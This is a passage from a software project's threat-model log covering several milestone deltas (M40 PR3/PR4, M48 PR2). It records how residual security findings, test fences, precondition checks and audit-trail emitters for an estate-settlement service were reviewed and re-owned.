  is not wrong; its CORPUS is narrower than the claim a reader takes from it, which
  is M45's general form, found in the fence M45's own members are about — three
  of them the moment this bullet exists, which is the same corpus-counts-its-own-
  commentary shape §6fff's TB7 figure records two sections down.
- **[ACCEPTED]** *A queue row is ownership, not a schedule.* M45 and M46 open with
  no PR split and no sequencing, so ten of these seventeen moved from an owner who
  could not do them to an owner who has not planned them. That is a real
  improvement — an item with a row is an item that can be costed, and `OWNERS`
  now derives both from the table — but it is not the same as being scheduled, and
  it is stated here so the next reader does not read "owned" as "planned".
- **[ACCEPTED]** *Nothing distinguishes a mechanism that EXISTS from a mechanism
  that BINDS, and CLOSED is the disposition that depends on the difference.* This
  PR drafted two closures on the evidence that a decorator was present on the
  right routes, and the decorator widens rather than binds; the review caught
  both. Every other disposition leaves the item legible — an owner can be wrong
  and the next sweep re-reads it — but CLOSED asserts the work is done and is the
  one answer that stops anyone looking. No fence can check it: deciding whether
  prose describes shipped behaviour is not a thing to automate. Accepted with the
  rule stated instead, because the rule is what transfers: **close on the
  BEHAVIOUR, demonstrated, never on the presence of the mechanism named in the
  bullet** — and if the demonstration is a decorator, read what the decorator
  returns.

## 6ggg. Threat-model delta — M40 PR3, a deferral whose trigger nobody watched (2026-08-26)

**Not a control change; no runtime code moves.** M40 PR3 adjudicates the thirteen
residuals owned by a milestone that has already SHIPPED — M23 twelve, M22 one —
one at a time, and both counts go to **zero**. Thirteen bullets become SEVENTEEN
items, because two of them carried three things each: **eight accepted on their
own bounds, four to M45, two to M46, two to M47, and one to M26.** That is
8+4+2+2+1 = 17, stated as a sum because a partition whose parts are listed and
never added is a partition nobody checked. Nothing closed.

**Five of the thirteen were still TRUE. Eight carried at least one FALSE
clause** — and that is the finding rather than the bookkeeping. THE CRITERION,
stated because two independent readings of an earlier draft produced the same
5/8 with DIFFERENT MEMBERS, which is the count-agrees-for-the-wrong-reason shape
this fence exists to catch: a bullet HELD if every assertion in it still
verified, and an OMISSION does not count as decay. THE TWO SPENT PRECONDITIONS
LAND ON OPPOSITE SIDES OF IT, which looks inconsistent and is not: §6dd's
distributions bullet asserted a FACT about the tree — "the route has no consumer
anywhere" — and M23 PR4b made that sentence false, so the bullet carries a false
clause. §6bb's interstitial asserted a CONDITION — that the question has a real
answer "once there is something behind it" — and the console shipping SATISFIED
it rather than falsifying it. Both deferrals were spent unwatched, which is why
both are evidence for the shape below; only one of them now contains a sentence
that is untrue. A spent precondition is not the same defect as a false claim, and
collapsing them would have made the 5/8 split mean nothing. Every one of the thirteen was
rewritten, so "held exactly as written" — the earlier phrasing — was false of all
thirteen and measured the bookkeeping instead.

STILL TRUE (5): §6d conversations; §6bb the interstitial; §6cc the stale screen;
§6cc the review of reads; §6ee form-action. FALSE IN SOME CLAUSE (8): §6g unlink
(the stop is narrower than it claimed); §6bb the bound (two of four clauses);
§6dd distributions (its precondition spent); §6dd the bearer fence (undercounts
its own subject); §6dd egress (named one of three copies); §6dd the edge items
(half its population); §6dd audience specs (wrong in two places); §6ee the CSP
remedy (names a harness that cannot do it). A residual owned by a COMPLETE
milestone is not merely unowned; it is unread, and prose nobody re-reads decays
in a particular direction.

**A DEFERRAL'S PRECONDITION CAN BE SPENT BY A LATER PR, AND NOTHING
WATCHES.** Two of the thirteen deferred on a stated condition rather than
on a judgement, and both conditions were met without anyone re-deciding.

- §6dd's distribution bullet said it was "left as found BECAUSE the route has no
  consumer anywhere — no BFF client, and the operator edge's exact-match
  allowlist does not carry it". **M23 PR4b (`4e125e1`, #141) then built exactly
  that consumer and did not add the emit**: a BFF client method, the
  `setEstateDistributionStatus` mutation, a three-member SDL enum, and an
  executor button reading "Raise a dispute" on a paid-out row. A latent defect
  became a LIVE one on a step-up-gated write verb. **AND NOT WITHIN THE MILESTONE
  THAT WROTE IT**: §6dd is M21 PR4's delta section, so M21 wrote that sentence and
  M23 PR4b spent it — a DIFFERENT milestone, and only TWO DAYS later (§6dd is
  dated 2026-08-19, `4e125e1` landed 2026-08-21). The short gap makes the shape
  WORSE rather than better. Nothing here decayed with age; the spender simply had
  no reason to read the section, because it belonged to somebody else's
  milestone. An earlier draft made the opposite claim — that the
  precondition was spent by a PR of the very milestone that deferred it — NINE
  times across these four files, and the first review pass caught three. THE
  CORRECTION THEN OVERSHOT: a second draft generalised it to "every instance
  crosses a milestone boundary", which the second review pass refuted from this
  document's own text — §6bb's interstitial was deferred by M21 PR3a and met by
  M21 PR3b. TWO OF THE THREE CROSS, so the honest headline names neither, and the
  bold lead-in above says only "a later PR". A false general claim and its
  equally false opposite came from the same habit: writing the rule from the
  instance in front of me. Correcting it also tripped the language rule two
  bullets down, because the phrasing being corrected IS the idiom that rule
  scans for. A wrong sentence copied to where it is
  load-bearing is this document's most reliable defect.
- §6bb's interstitial bullet said "how an operator finds it is a question with a
  real answer only once there is something behind it". The console shipped;
  nobody re-decided. That one costs nothing — re-decided here, same answer — and
  it is recorded beside the other because the SHAPE is identical and only the
  consequence differs.

**The general form: a deferral that names its own trigger is only as good as
whatever watches the trigger, and here nothing did.** A residual is re-read when
somebody sweeps residuals; the event that discharges it happens somewhere else
entirely, in a PR that has no reason to look.

**AND THE JUSTIFICATION UNDER §6bb'S BOUND DIED THE DAY AFTER IT WAS WRITTEN.**
That bullet argued there was no rate limit on any operator verb "because a bound
whose only caller is a surface that does not exist is a control nobody
exercises". M22 PR1 (`a7eb15b`, §6ii) shipped one the next day — an append-only
operator action ledger with a derived coverage fence and a twelve-case ceiling —
which is the direct refutation of the reasoning, not merely a change of facts.
What survives is the READ half, and it survives with one precision an earlier
draft of this paragraph got wrong. Operator reads ARE on the trail — M21 PR3b
gave them one — `settlement.queue.viewed` and `settlement.case.viewed` — and
`AUDIT_ACTIONS` carries a third, `settlement.distribution.amount_viewed`, added
later by M23 PR4b (`4e125e1`); an earlier draft of this paragraph credited all
three to PR3b. So "nothing records them" would have been false, and this document says so two
sections up. What is absent is a BOUND and a REVIEW: the breadth ledger records
ACTIONS, its own `EXEMPT` map declares the two worklist reads out with the reason
"READ. The worklist emits its own `worklist.viewed`; breadth is about acting on
estates, not about seeing which need acting on", and the case reads reach the
gate without being counted by it. So an operator may read every estate on the platform, each read
landing in an append-only trail that nothing bounds and nobody reviews. That is M46's, recorded twice — once
from the bound side at §6bb and once from the audit side at §6cc — as ONE claim
under ONE owner, which is the shape M40 PR1 established.

| From | Became | Why |
| --- | --- | --- |
| §6d conversations | `ACCEPTED` | a settled design, enforced and tested — not an unbuilt surface |
| §6g unlink (the one M22) | `ACCEPTED` | three decisions already argued out in source |
| §6bb operator bound | `M46` | write half shipped as §6ii; the READ half is untouched |
| §6bb interstitial | `ACCEPTED` | trigger met, re-decided here, answer unchanged |
| §6cc stale screen | `ACCEPTED` | a UX cost against a locked row, not a control gap |
| §6cc review of reads | `M46` | the same gap as §6bb, from the audit side |
| §6dd distributions | `M26` | **the deferral's precondition was spent** |
| §6dd bearer fence | `M45` | two of three assertions read one file |
| §6dd egress sinks | `M45` | a hand-listed vocabulary, in three copies |
| §6dd edge items | `ACCEPTED` ×2 + `M47` | one bullet, THREE items, and "operator-edge" was half the population |
| §6dd audience specs | `M45` ×2 + `ACCEPTED` | one bullet, THREE items; two of them wrong in a NEW way |
| §6ee CSP refusal | `ACCEPTED` | a property of the runner, and the remedy named a harness that cannot do it |
| §6ee form-action | `M47` | detected, never prevented |

**M47 IS THE ROW THIS PR OPENS, and it exists because a rule was applied to one
member of a category.** Three shapes on the operator edge — the malformed-`Host`
500, the unread `secureCookies`, and `APP_ORIGIN` validated as a URL rather than
an origin — are each duplicated on the vault edge: three shapes across two
origins is SIX instances, and the bullet recording them named three. The two
isolated origins were built from one template and have drifted apart with nothing
comparing them. M47 owns that pair, and the form-action parity item joins it for
the same reason: the vault launcher carries the identical split, so tagging only
the operator half would have recreated the one-category-two-owners defect M40 PR1
closed. **Explicitly not E1** — E1 is the AWS half, blocked on money, and none of
this needs AWS anything; assigning it there would be an owner chosen for being
nearby, which is the defect M40 PR2 named.

**THE ASSERTION THAT GUARDED THE STALE SET CANNOT SURVIVE ITS OWN SUCCESS.** With
M22 and M23 at zero, the pinned pair the fence carried —
the owner-SET comparison against `STALE_OWNERS` and `expect(stale.length).toBe(STALE_OWNED)`
— becomes `[] vs []` and `0 === 0`, which passes identically if the parser breaks,
if the COMPLETE set comes back empty, or if the corpus is never read. A zero that
cannot fail is not a measurement. It is answered here with a POSITIVE CONTROL: a
synthetic bullet tagged with a milestone the queue table really marks
`**COMPLETE.**` — taken from the derived set, never hard-coded — is run through
the same predicate, and the fence asserts it FIRES, with a negative twin on a
LIVE milestone so the control cannot pass by matching everything.

**AND THE FIRST ACCOUNT OF WHAT THAT CONTROL COVERS WAS WRONG, WHICH THE
MUTATION SAID AND THE PROSE DID NOT.** The draft claimed it caught a broken
status column or an empty completed set. It does not: both are already caught
one assertion earlier by `MIN_COMPLETED_MILESTONES`, and breaking the completed
derivation reddens the file with or without the control. What the control
uniquely catches is the PREDICATE going wrong while its inputs stay healthy —
`staleAmong` returning `[]` leaves the two real-corpus expectations at `[] vs []`
and `0 === 0`. Demonstrated as a PAIR rather than claimed: the same mutation with
the control present fails one test, and with the control removed the whole file
passes. A control whose coverage is described from intention rather than from a
counterfactual is the same defect as a residual whose precondition nobody
watched, one file over.

### Residuals

- **[CLOSED: §6hhh]** *A deferral's precondition is prose, and nothing re-checks it.*
  Two of the thirteen deferred on a condition — "no consumer exists", "once there
  is something behind it" — that a later PR met without noticing. The conditions
  are English inside a bullet, so no mechanism can watch them, and the only reader
  is a sweep that happens on its own schedule. Making them DATA is the fix, and it
  belongs to this milestone's remaining PR rather than to a new row, because M40
  is the milestone that keeps finding the shape. **CLOSED BY M40 PR4** (§6hhh),
  which is that PR: `PRECONDITIONS` in `threat-model-residuals.spec.ts` holds each
  absence as data with the state MEASURED against the tree, the assertion reddens
  in both directions naming the RESIDUAL, and a derived companion requires every
  absence-asserting deferral to be probed or exempted with a reason. Closed on
  demonstrated behaviour rather than on the mechanism's presence — the M40 PR2
  rule — by a counterfactual pair: blind the scanner AND bend the declaration to
  match it, and the assertion fails with the controls present and passes with
  them removed.
- **[ACCEPTED]** *A count in a delta section needs to say whether it describes
  the PR or the tree, and §6cc held one of each.* Its two counts looked alike and
  were not. "Thirteen routes" was TRUE OF PR3B and stale for today, so an earlier
  M40 PR3 draft broke it by "correcting" it to fourteen; it is restored, because
  a delta section's narrative records what its PR did. "Four of the thirteen
  reach a case through `assertCaseVisible`" was NEVER true, of PR3b or of today:
  four methods called the predicate at `9101c12`, but one of them, `listTasks`,
  is not among the thirteen — `cases/:caseId/tasks` has no operator audience and
  no `PROXY_ROUTES` entry. The sentence counted call sites in the SERVICE and
  reported them as routes at the EDGE, which is the same category slip as
  counting a mention as a citation. Corrected to three. THE TWO REPAIRS POINT IN
  OPPOSITE DIRECTIONS — one number restored to the past, one corrected to the
  present — and only reading each against what its own clause claims separates
  them. Accepted rather than owned because the fix is a habit, not a mechanism:
  no fence can read an English sentence and tell which tree it means. Both were
  moved by M23 PR4b, which is also the PR that spent the §6dd deferral.
- **[ACCEPTED]** *The corpus language rule cannot tell USE from MENTION.* Writing
  this section tripped it: an evidence bullet that said a deferral was spent "and
  not inside its own milestone" was pulled INTO the residual corpus, because
  `residualLanguage` matches the literal phrase `its own milestone` and has no way
  to know the bullet was quoting the idiom rather than using it. The fence was
  RIGHT to fire — the bullet had no disposition tag — and the repair was to reword
  the prose, not to weaken the pattern. IT THEN FIRED A SECOND TIME IN THIS SAME
  SECTION, on the correction to a NEIGHBOURING bullet, for the same reason: the
  phrasing being corrected is itself the idiom the rule scans for, so writing down
  what was wrong reproduces the trigger. Counted as one incident class rather than
  two, because it is the same rule on the same section — but a rule you cannot
  quote without tripping is a cost worth stating. Accepted because the alternative is worse:
  a rule that tries to distinguish use from mention in English is a parser nobody
  can keep correct, and the failure is LOUD and immediate. Recorded because this is
  the FIFTH time a corpus in this document has read the commentary about itself.
  M40 PR1 found three — the unanchored residual-tag grep, the `assistant_disabled`
  sweep, and the citation sweep, where a citation and a mention of a citation were
  indistinguishable — §6fff's TB7 line count is the fourth, and this is the fifth.
  An earlier draft of this bullet said "fourth" by naming only two of PR1's three,
  which is the same undercount by hand that the shape itself keeps producing.
- **[ACCEPTED]** *The positive control proves the DETECTOR, not the document.* A
  synthetic bullet fed through the stale predicate shows the predicate fires; it
  cannot show that the real corpus was parsed, and a fence green on a synthetic
  input beside an empty real one is exactly the pair that looks like proof. What
  carries the real half is the totality assertion and the per-section floors,
  which are stated here so the next reader does not mistake the control for the
  measurement.
- **[OWNER: M47]** *Nothing derives what the two isolated origins should share.*
  `operator-web` and `vault-web` were built from one template, and the shapes this
  PR found on both were found by hand, one at a time. Six instances of three
  shapes is the count today; nothing computes it, so a seventh written tomorrow
  joins the category unnoticed — which is precisely how the bullet M47 inherits
  came to describe half of its own population.

## 6hhh. Threat-model delta — M40 PR4, the security review (2026-08-27)

**A security review of a milestone that shipped no runtime code.** M40's four
merged PRs touch four files and no service. Its security surface is therefore
not new attack surface but the DECISIONS it made — thirteen residuals it marked
`[ACCEPTED]`, which is a standing choice to leave a recorded weakness alone —
and the SHAPE it found: a deferral justified by an absence that a later PR
filled with nobody watching. M40 PR3 caught one of those by hand while
adjudicating thirteen bullets. This PR asks whether there are others, and turns
the question into a mechanism.

### The spent-precondition sweep

Some residuals justify leaving a defect alone by asserting an ABSENCE: "the
route has no consumer anywhere", "read by nothing", "a surface that does not
exist". Those justifications were TRUE when written. Nothing re-checks them, and
the event that spends one happens somewhere else entirely, in a PR that has no
reason to read the section stating it.

**TWELVE absence-asserting residuals were checked against the CODE, not against
other prose**, each by an independent reviewer, with two refute-by-default
verifiers on every positive. The corpus was derived: every one of the 256 tagged
bullets was parsed and matched against stated-absence language, and the parser's
count was reconciled against the fence's own total before the sweep ran.

**THE RESULT IS CLEAN, AND IT COULD HAVE FAILED.** No new spent precondition
was found. That is only worth writing down because the sweep carried a POSITIVE
CONTROL: §6dd's distribution emit — the one M40 PR3 already proved spent — was
put through the identical process without being marked, and came back SPENT at
high severity. A sweep that returns "nothing found" and a sweep that cannot find
anything produce the same report; this one demonstrated it could still find the
defect it was hunting.

**EVERY FALSE POSITIVE WAS A `CLOSED` BULLET, THREE OF THREE.** Four candidates
survived the first pass and all four were refuted 2-of-2. Three of them —
§6j's extension overwrite, §6ff's `setDistributionStatus` refusal, §6mm's three
consumerless routes — are tagged `CLOSED`, and they failed for one reason worth
keeping: **in a CLOSED bullet the absence has the OPPOSITE POLARITY.** It
explains why a FIX WAS CHEAP ("no consumer exists to break"), not why a fix was
DEFERRED. Nothing was left undone on the strength of it, so it cannot be spent
in the sense that matters. The fourth, §6z's revocation notice, is a bullet
whose absence IS spent and which SAYS SO in its own text — M40 PR2 re-owned it
to M46 noting "that surface now EXISTS". The reviewer read the first half and
stopped before the retraction; both verifiers caught that.

### The preconditions are DATA now

§6ggg recorded that a deferral's precondition is English inside a bullet, that
no mechanism can watch it, and that the only reader is a sweep on its own
schedule. `threat-model-residuals.spec.ts` now carries `PRECONDITIONS`: each
entry names the section, the residual's title, the absence quoted from it, the
source corpus to scan, the pattern whose match means the absence is FILLED, and
**the state MEASURED at this PR**.

The assertion is that the state has not CHANGED, which reddens in BOTH
directions. A consumer appearing under an `absent` entry is the M40 PR3 defect
happening again, and one disappearing under a `filled` entry means an owner's
fix is scoped against a surface that has since moved. The failure names the
RESIDUAL rather than the file, so whoever adds the consumer is told which
decision they just retired.

**THE POSITIVE CONTROL IS DRAWN FROM THE REAL TREE, not synthesised.** §6dd's
distribution entry is declared `filled`, because it is. A registry whose every
probe answers "still absent" passes identically when the scanner is broken, the
glob matches nothing, or the pattern cannot match — the same
cannot-survive-its-own-success shape the stale-owner assertion had one test
below, and the reason that one needed a control too. Here at least one entry
MUST report FILLED against the live tree, with a negative twin requiring at
least one to report ABSENT so that "filled" is a measurement rather than a
matcher firing on everything.

**Its coverage is stated from a COUNTERFACTUAL.** The mutation that isolates the
control is not a broken scanner — the state comparison catches that on its own —
but a broken scanner PLUS the tempting wrong fix of bending the declaration to
match it. With both applied and the controls PRESENT, `no deferral has had its
stated precondition SPENT` fails; with the same mutation and the controls
REMOVED, it passes. Demonstrated as a pair, with each mutation verified on disk
before the run.

**THE COMPLETENESS HALF IS DERIVED, because a hand-kept registry beside a corpus
that grows is this repo's most repeated defect.** A second assertion scans every
non-CLOSED residual for stated-absence language and requires each match to be
either probed or exempted with a reason; a new residual written with an absence
justification reddens until somebody says which. Five are probed and four are
exempt, each exemption carrying why a narrow probe is not available — a property
of an account rather than of the tree, a finding already recorded, three
absences in one bullet, or a reachability question a presence check cannot model.

**A PROBE SHAPED LIKE THE ABSENCE'S WORDS FINDS THE WRONG THING.** A first draft
of the `document_search_tokens` probe grepped for `DELETE FROM` and reported the
absence SPENT. What it had found was `SearchTokensRepo.replaceForDocument`, a
sanctioned replace-in-place on RE-INDEX that the file's own docstring and
`002_document_vault.sql` both declare — not the erasure purge the residual is
about. The hand sweep had it right and the mechanism had it wrong, which is the
argument for building the mechanism only where the absence has a narrow shape.

### The escalation half, decided

§6vv recorded that twenty-two residual tags name an escalation while docs/04's
escalation rows answered only "what is this blocked on", so nothing could report
a change — a rule applied to one member of a category, the milestone half having
gained a lifecycle token at M40 PR0. It also warned that copying `PLANNED /
IN PROGRESS / COMPLETE` across would be **the fix that looks total and is not**.
That warning is correct and the reason is worth stating as a rule:

> A milestone reading COMPLETE makes a residual naming it **stale** — the work is
> DONE and the tag points at nobody. An escalation reading CLEARED makes a
> residual naming it **schedulable** — the blocker lifted, the work can finally
> START, and until somebody re-owns it to a milestone it is owed by an entry that
> is no longer blocking anything. Same mechanism, opposite meaning.

So the escalations table gains a **State** cell over its own two-word closed
vocabulary, `**BLOCKED.**` / `**CLEARED.**`, describing the BLOCKER rather than
the work. All five rows read BLOCKED, which was measured rather than assumed: no
escalation in this repo has ever cleared. Two assertions follow — every
escalation row declares a state, and **no residual names an escalation whose
blocker has CLEARED**.

**THE SECOND IS VACUOUS TODAY AND SHIPS WITH THE REPAIR ANYWAY.** With nothing
cleared it compares `[]` against `[]`, which is what a correct run produces AND
what a broken parser, a renamed column or an empty corpus produce. That is the
defect M40 PR3 spent a PR repairing one assertion away, and the lesson only
counts if it is applied before the assertion acquires the fault rather than
after: the predicate is exercised by a synthetic bullet built from a DERIVED
escalation id, with a negative twin on a milestone tag so a predicate that fires
on everything is not mistaken for one that fires correctly, and a floor
asserting the escalation-owned residuals are genuinely in the corpus being
checked. Both assertions were proved by mutation — blanking E3's State cell
reddens the first by row name, marking E1 CLEARED reddens the second.

**THE BULLET'S OWN COUNTS HAD ROTTED WHILE IT SAT THERE**, which is the defect it
describes happening to itself. It said E1 carried twenty residuals and the total
was twenty-one; both are E1 twenty-one and total twenty-two today. The figures
are left as they were measured and dated, and the live number is derived by the
fence rather than restated in prose — the rule this repo already has about a
count beside a mechanism that computes one.

### Re-adjudicating M40's own ACCEPTED decisions

`[ACCEPTED]` is not "fixed" and not "deferred". It is a STANDING DECISION TO
LEAVE A RECORDED WEAKNESS ALONE, resting on an argument written in the bullet.
M40 wrote THIRTEEN of them across other milestones' sections — PR2's five and
PR3's eight — and amended a FOURTEENTH whose tag predates it (§6cc's
operator-console bullet, `[ACCEPTED]` since `9101c12`). Those fourteen are this
milestone's actual security surface. Its own delta sections carry six more, which
are not re-adjudicated here: a section does not review itself. Every one was re-adjudicated against the
code, with two refute-by-default verifiers on any call to reopen.

**NINE STAND. FOUR ARE IMPRECISE — right disposition, wrong clause. ONE REOPENS.**

**THE ONE THAT REOPENS IS §6g, AND ITS ARGUMENT NEVER REACHED THE SURFACE IT WAS
DEFENDING.** That bullet named two survivors of an unlink and one gate. There are
seven, behind two gates. (**M48 CORRECTED THIS TO EIGHT BEHIND THREE**:
`CasesRepo.listForUser`'s raw-SQL `OR reported_by = $1` is a third gate this
review did not reach. The count was verified when written and was verified
COMPLETE by nobody — the verifier was asked whether seven existed, not whether an
eighth did.) `assertCaseVisible` takes no Cedar decision at all —
`caseResource`, the mechanism the bullet credits, appears zero times in
`admin.service.ts` — and admits on the bare snapshot `kase.reported_by === actor`,
carrying `timeline`, `listStages`, `listTasks`, `listDistributions` and
`distributionAmount`. The last decrypts the estate's distribution amounts under
the DECEDENT's DEK and returns plaintext money to a contact the owner has
removed. All five sit POST-verification, which is precisely the window the
bullet's own final sentence says the owner's void does not reach; the
acceptance's third leg was never load-bearing for them. Four of the five emit
nothing, because `recordOperatorRead` early-returns `if (!isOperator)`.

**THE PROTECTIVE ACTION IS NOT HARDER THAN THE PERMISSIVE ONE — IT IS
INEFFECTIVE, WHICH IS THE WORSE VARIANT.** Granting a contact link is
`@UseGuards(StepUpGuard)`; unlinking is one click and deliberately ungated,
exactly as this repo's design rules require. But the click removes a live link
while the settlement gate reads a frozen column the unlink cannot reach, so the
owner performs the protective action, is told nothing, and the removed contact
keeps the money route. The asymmetry is three lines wide: the executor arm of
that same `if` calls `isExecutorOf` LIVE. The platform already knows how to
enforce a link's lifetime; it does it for one party and not the other, on the
same estate, in the same conditional. **SPLIT AND OWNED**: the case-exists reads
stay `[ACCEPTED]` because a reporter seeing the case they filed is the evidence
trail §5.1 c6 makes by DDL; the money and the missing trail go to **M48**.

**THE FOUR IMPRECISE ONES ARE RECORDED, NOT FIXED** — this is an adjudication
milestone and a prose sweep of other sections is a different change:

- **§6b intake rate limiting.** M40 PR2's repair names the sibling twice over —
  as *Operator actions remain unbounded* at **§6bb**, "owned by **M23** today".
  M40 PR3, the next PR of the same milestone and the same day, retitled that
  bullet to *Operator READS are bounded, counted and reviewed by nothing* and
  re-owned it to **M46**. Both halves of the repair were falsified within a day
  of being written, and the sentence still stands — the shape §6fff records, with
  this milestone as the invalidating author.
- **§6dd `config.secureCookies`.** "Dropping `Secure` there turns three NAMED
  assertions red … Both edges are the same" is the OPERATOR figure asserted of a
  two-edge pair. Measured by mutation: three reds on `operator-web`, exactly ONE
  on `vault-web`, which has no `cookies.spec.ts` at all. The half-applied rule
  again, in a bullet M47 already exists because of.
- **§6o reset path.** Its parenthetical cross-reference to "§6m question 8" is a
  dead pointer: §6m has no numbered list, and the word "question" does not occur
  anywhere in it. Introduced at M17 PR5 (`1ff424a`), it was carried through M40
  PR2's rewrite of the very line it sits on.
- **§6d conversations.** "The three access rungs … in five independent spellings"
  is an undercount, and the interesting part is that two independent reviewers
  derived SIX and EIGHT using different definitions of a spelling. A number whose
  value depends on what you count is a number that does not belong in prose beside
  a mechanism that could derive it — this document's own rule, illustrated by a
  sentence that breaks it.

### Residuals

- **[ACCEPTED]** *A clean sweep is evidence about the corpus it ran on, not
  about the corpus it did not.* Twelve residuals were checked because twelve
  assert an absence in language the parser recognises. A deferral justified by
  an absence phrased some other way — "there is nobody to tell", "that path is
  theoretical" — is outside the pattern and was never in the sweep. The
  derived completeness assertion narrows this over time rather than closing it,
  because it reddens on the phrasings it knows and stays silent on the rest.
  Accepted because the alternative is a rule that parses English intent, which
  is the parser nobody can keep correct.
- **[OWNER: M45]** *The probes read source, and source is not the deployment.*
  Every entry scans tracked `.ts`/`.sql` files. An absence filled by
  configuration, by a Terraform resource, or by a container image built from a
  Dockerfile this scan does not read would go unnoticed, and the fence would go
  on reporting the absence intact. M45 owns fence corpus breadth and this is
  that shape again: the reach is narrower than the claim, so the claim is stated
  here and the reach is declared in the spec.
- **[ACCEPTED]** *The state is a measurement, so a wrong measurement ratchets
  in.* Each entry records what was true when it was written, and the assertion
  compares today against that. A state recorded wrongly is therefore asserted
  forever, and the fence would defend the error. Accepted because the failure is
  LOUD in the direction that matters — a `filled` entry that should read
  `absent` reddens immediately and is fixed in the same sitting — and because
  the alternative, deriving the state at runtime, is what the entry already does
  and would compare only against itself.

## 6iii. Threat-model delta — M48 PR2, the trail (2026-08-28)

**M48 PR1 made the gate correct and left nothing watching it work.** Six case
reads sit behind two gates — five behind `assertCaseVisible`, and `getCase`
behind a Cedar decision. Five of the six recorded ONLY platform staff, because
`recordOperatorRead` opened `if (!isOperator) return;` and `getCase` spelled the
same condition inline; the sixth, `distributionAmount`, produced no case-trail
row for anybody at all. This PR gives every one of them a trail and derives the
actor class from the gate that already had to compute it.

### The premise that was spent

`caseViewed`'s own docstring argued the narrowness was the decision, not an
omission: the non-operator readers are "people reading their own case, which the
rest of the product does not audit as a disclosure either". That holds for the
DECEDENT. It does not hold for the EXECUTOR, who administers somebody else's
estate — and the assets service has audited exactly that read as
`asset.estate.viewed` with `actorType: 'user'` since M7 PR2 (`031972c`).
Settlement's own `executorCases` cites that event by name as the reason it needs
none of its own. Settlement was the outlier, and its argument named a sibling
that disagreed with it.

The argument's other half — that a false actor class on an append-only trail is
worse than no row — is spent the moment the class is DERIVED. `assertCaseVisible`
returns the operator flag it had to compute to authorize the read; `getCase`
binds the same `OperatorGate.is` answer for its Cedar decision. The three
emitters this change touches — `caseViewed`, `worklistViewed` and
`distributionAmountViewed` — take `asOperator` REQUIRED rather than defaulted,
joining `evidenceAdded` and `distributionCompleted`, which already did; a new
caller that omits it fails to compile rather than silently recording an operator
as a user. `caseReported` keeps its `asOperator = false` default and is now the
file's only one. That is the defect this fixes, in the shape that cannot recur
by omission.

### One spelling, and a fence that derives it

The surface vocabulary existed TWICE — `CaseReadSurface` in `events.service.ts`
and a narrower copy as the wrapper's `surface` parameter — with nothing tying
either to the set of reads that actually go through a gate. They agreed by hand
until M23 PR4b added `distributionAmount` to `assertCaseVisible` and to neither
union, so from 2026-08-21 to this change the fifth gated read produced no
case-trail row and nothing went red.

The union is now declared once and FENCED against the source. **The corpus is
two files, one per gate**: the spec scans `admin.service.ts` for
`assertCaseVisible` callers and `settlement.service.ts` for `getCase`'s direct
emit, and compares the surfaces they record against the union in
`events.service.ts`. A read that records no surface fails one assertion by name;
a declared surface no read produces fails the other. Neither can be satisfied by
editing one file.

A read on NEITHER gate is outside that corpus and needs its own fence, which is
stated because the fence's first draft was narrower than its claim: `'case'` was
injected into the expected set BY HAND, so deleting `getCase`'s emit left both
assertions green. Scanning the second file is what makes that mutation red. The
scanner strips block comments and joins each method body before matching, for
the same reason — a call commented out with `/* … */`, or one whose arguments
wrapped over five lines, was read as a live call by the line-at-a-time version.
Its anti-vacuity floors run at every level: routes found, `assertCaseVisible`
call sites, and `recordCaseRead` call sites must agree, so a gated read whose
DECLARATION the scanner fails to recognize cannot vanish into the method above
it.

`listMyCases` is the read on neither gate. It is deliberately unaudited (below),
and `settlement.service.ts` carries the reason where someone would add the emit.

### What the harness could not say

`FakeFieldCrypto.decryptField` has always ACCEPTED an `actorType` and recorded
only `{ userId, field, actorId, purpose }`, dropping it. So
`crypto.field.decrypted` naming every operator's amount read as the estate's own
reader was not merely untested but UNPROVABLE: revert the fix and no assertion
could go red. The double records it now, and reverting the fix reddens exactly
one named test. Reverting the harness repair instead stops the proof compiling,
which is the sharpest statement of why it had to come first.

### Two worklists, and only one of them is audited

Deriving `actorType` spends a second argument as a side effect, and the spending
had to be spent deliberately. M23 PR2 gave `executorCases` no audit event on the
reasoning that it would need a NEW `AUDIT_ACTIONS` member, because
`settlement.queue.viewed` hardcoded `actorType: 'operator'` and an executor is
not one — and a new member costs a consumer deployment ahead of its producer.
Both halves die here: the hardcode is gone, so the reuse states nothing false
and costs no deployment. An omission whose only stated reason has been removed
is not still argued, so `executorCases` is audited now. It lists the estates one
person administers for OTHER people, which is the disclosure the sibling it
cited has recorded since M7 PR2.

**`listMyCases` is NOT, and the reason is volume.** It is the obvious companion
change and it was written, measured and taken back out. That route answers
`OpenSettlementCaseBanner`, mounted in `AppShell` — which wraps every page —
with its effect keyed on `pathname`. An event there writes ONE PERMANENT ROW PER
PAGE NAVIGATION for every authenticated user, on a trail with UPDATE and DELETE
revoked. §6cc already refuses to let the operator CONSOLE poll for exactly this
reason — "one screen, abandoned over lunch, into hundreds of recorded reads" —
and the console is staff, where this is every account. The same rows would also
drown the cross-case reconnaissance signal `settlement.queue.viewed` exists to
carry, leaving a `detail.worklist` token as its only discriminant. The purchase is weak besides:
`listMyCases` is somebody reading their OWN cases, where `executorCases` is
somebody reading other people's estates. The reason lives in
`settlement.service.ts`, at the line where the next person would add the emit.

### Residuals

- **[ACCEPTED]** *`actorType` cannot tell the decedent, a linked reporter and an
  executor apart.* All three are `user`. The distinction lives in `onBehalfOf`
  (which names the decedent) and in the case row, not in this vocabulary, and
  widening the enum would change a closed cross-service vocabulary for one
  service's convenience. A consumer that needs the finer answer joins the event
  to the case it names.
- **[ACCEPTED]** *`listMyCases` remains the one case-reading route that emits
  nothing.* Argued above: the volume is a property of the app-shell banner it
  answers, not of the read. Recording it needs a route the banner does not
  share, or a shape that is not one row per read — neither of which this PR
  needs. The audited reads it might otherwise have covered are audited where
  they happen, one case at a time, behind both gates.
- **[CLOSED: §6jjj]** *The `distributions` encrypt-only bound still fires on
  every legitimate amount read.* `ENCRYPT_ONLY_PREFIXES` asserts that no read
  route exists for that prefix and M23 PR4b shipped one, and `boundFor` returns
  `maxPerWindow: 0` before it looks at the principal — so deriving `actorType`
  here does not clear it. Recorded rather than fixed in this PR because it is an
  audit-service control, not a settlement emitter. **CLOSED by M48 PR3**, which
  deleted the encrypt-only class rather than exempting the route.
- **[CLOSED: §6jjj]** *An unlinked reporter can still WRITE to a dead person's
  evidence trail.* `attachCaseEvidence` authorizes on the Cedar half, which
  snapshots `reported_by`, so M48 PR1's live link check does not reach it — PR1
  demonstrated it in a browser and left it as a question. It is a write, and
  this PR's subject is the read trail. **CLOSED by M48 PR3**, which applied
  `report`'s own intake rule to the follow-up write.

## 6jjj. Threat-model delta — M48 PR3, the loose ends (2026-09-02)

